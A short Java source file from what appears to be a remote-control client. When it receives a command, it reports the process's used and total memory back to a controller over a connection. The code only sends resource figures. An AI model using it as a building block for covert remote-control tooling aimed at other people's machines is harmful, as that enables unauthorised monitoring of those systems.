package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.packets.outgoing.Header;

public class PacketGETRAM extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Runtime rt = Runtime.getRuntime();
		long usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024L / 1024L;
		long totalMB = rt.totalMemory() / 1024L / 1024L;
		
		Connection.addToSendQueue(new PacketBuilder(Header.RAM, new Long[] { usedMB, totalMB }));
	}

}
